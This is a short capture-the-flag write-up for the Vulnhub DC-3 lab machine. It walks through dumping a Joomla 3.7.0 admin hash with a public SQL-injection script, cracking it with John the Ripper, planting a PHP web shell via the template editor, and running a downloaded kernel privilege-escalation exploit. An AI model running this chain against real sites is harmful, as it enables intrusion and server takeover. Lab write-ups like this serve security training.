<h1>DC-3 Write-up</h1>

<h3>PORT 80</h3>

**Joomla 3.7.0**

Exploit : https://github.com/XiphosResearch/exploits/tree/master/Joomblah

```python joom.py http://192.168.56.48/```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-3/images/joompass.png)

```
Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
```
Cracking Joomla Password 

```
echo "$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu" > hash
john hash --wordlist=rockyou.txt
crackedhash:snoopy
user:admin
```

Now i can login with **"admin"** user and **"snoopy"** password in joomla admin panel (/administrator)

<h3>Joomla To shell</h3> 

* navigate to "Extensions" > "Templates" > "Templates"
* Click on any Theme
* Click on "New File"  Now upload or create new file 
* call the shell file 

URL : http://IP/templates/THENAMEOFTEMPLATEYOUSELECTEDPRIVIOUSLY/shell.php

MYURL : http://192.168.56.48//templates/protostar/shell.php

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-3/images/shell.png)

<h3>Privilege Escalation :</h3>

Exploit : https://www.exploit-db.com/exploits/39772

Download : https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

extract the exploit.tar file and transfer into DC-3 box then :

```
./compile.sh
./doubleput
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-3/images/privesc%20and%20flag.png)



